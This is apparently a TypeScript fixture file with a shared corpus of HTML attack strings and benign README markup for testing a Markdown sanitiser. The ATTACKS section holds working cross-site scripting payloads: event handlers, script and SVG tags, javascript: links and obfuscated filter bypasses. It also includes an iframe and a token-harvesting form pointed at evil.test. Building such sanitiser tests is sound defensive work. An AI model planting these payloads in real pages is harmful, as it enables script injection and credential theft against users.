/**
 * The corpus the Markdown sanitiser is tested against, in one place because two
 * suites have to run over exactly the same strings.
 *
 * `markdownHtml.test.tsx` puts each of these through `sanitizeMarkdownHtml`
 * directly. `markdownBlocks.test.tsx` puts each of them through the per-block
 * split, which parses a document into its top-level elements and sanitises each
 * one on its own — and the claim that licenses that design is that the two
 * paths come out the same. A corpus copied into the second suite would let the
 * two drift apart silently, and the first suite is the one people add attacks
 * to, so it is the one that must not be able to gain an attack the second never
 * sees.
 *
 * A new attack goes here and gets its own assertion in `markdownHtml.test.tsx`.
 * It is then in the split path's sweep without anybody remembering to put it
 * there.
 */

/** Markup a `.md` file might carry that must not survive as written. */
export const ATTACKS = {
  /** The classic one: an image handler that fires with no click anywhere. */
  imageErrorHandler: '<p>hello<img src=x onerror="alert(1)"></p>',

  /** Script as an element, which must go with its contents. */
  scriptElement: '<p>a</p><script>alert(1)</script>',

  /** A scheme that runs rather than navigates. */
  javascriptHref: '<a href="javascript:alert(1)">click</a>',

  /** A whole document from somewhere else, inside this origin. */
  iframe: '<iframe src="https://evil.test/"></iframe>',

  /** The two elements that are an iframe wearing a hat. */
  objectAndEmbed: '<object data="x"></object><embed src="y">',

  /** Foreign content: a different tokeniser, and where most bypasses live. */
  inlineSvg: '<svg><script>alert(1)</script></svg><svg onload="alert(1)"></svg>',

  /** The mutation payload, which is the other foreign-content mode. */
  mathMl:
    '<math><mtext><table><mglyph><style><!--</style></mglyph></table></mtext></math>',

  /** Handlers on a tag the sanitiser otherwise keeps. */
  eventHandlers: '<p onmouseover="alert(1)" onclick="alert(2)">text</p>',

  /** A spread of handler shapes, so one nobody listed is caught by the sweep. */
  everyShapeOfHandler:
    '<p onfocus=alert(1) autofocus>a</p>' +
    '<details ontoggle=alert(1) open>b</details>' +
    '<div onpointerover=alert(1)>c</div>' +
    '<video onerror=alert(1)><source onerror=alert(1)></video>' +
    '<body onload=alert(1)>',

  /** A stylesheet for the whole application, since the card body is light DOM. */
  styleElement: '<style>body { display: none }</style><p>a</p>',

  /** The same overlay attack, one element at a time. */
  styleAttribute:
    '<p style="position:fixed;inset:0;z-index:99999;background:#fff">Sign in again</p>',

  /** A phishing surface in the one origin where it would look at home. */
  formControls:
    '<form action="https://evil.test/"><input name="token"><textarea></textarea>' +
    '<select><option>x</option></select><button>Sign in</button></form>',

  /** The names this page queries by and then acts on the result of. */
  dataAttributes: '<p data-thread="1" data-reply-for="99" data-file-card="src/app.ts">x</p>',

  /** The other thing this page queries by. */
  ids: '<p id="view-tab-files">x</p><p id="root">y</p>',

  /** The shapes written to slip past a filter that reads rather than parses. */
  naiveFilterBypasses:
    '<img src=x onerror=alert(1)//>' +
    '<scr<script>ipt>alert(1)</scr</script>ipt>' +
    '<a href="jav&#x09;ascript:alert(1)">x</a>' +
    '<a href="JaVaScRiPt:alert(1)">y</a>' +
    '<a href="&#106;avascript:alert(1)">z</a>' +
    '<p><![CDATA[<script>alert(1)</script>]]></p>',
} as const;

/** Markup the mode would not be worth having without. */
export const DOCUMENTS = {
  /** The marks the word diff put in, which the sanitiser holds the only copy of. */
  diffMarks:
    '<p>a <del class="diffdel">gone</del> <ins class="diffins">new</ins> ' +
    '<del class="diffmod">old</del><ins class="diffmod">fresh</ins></p>',

  /** The structures a README is made of. */
  readmeStructures:
    '<h1>T</h1><h2>S</h2><p>text with <strong>bold</strong> and <em>italic</em> and ' +
    '<code>code</code></p><ul><li>a</li></ul><ol><li>b</li></ol>' +
    '<blockquote><p>q</p></blockquote><pre><code>x</code></pre>' +
    '<table><thead><tr><th>h</th></tr></thead><tbody><tr><td>d</td></tr></tbody></table>' +
    '<hr><a href="https://example.test/page">link</a>',

  /** The class an image placeholder is styled by. */
  imagePlaceholder: '<span class="md-image">Image: logo (a.png)</span>',

  /** Broken but harmless and honest. */
  relativeLink: '<a href="./CONTRIBUTING.md">contributing</a>',
} as const;

/** Every string above, for a test that sweeps the lot. */
export const EVERY_FIXTURE: readonly string[] = [
  ...Object.values(ATTACKS),
  ...Object.values(DOCUMENTS),
];
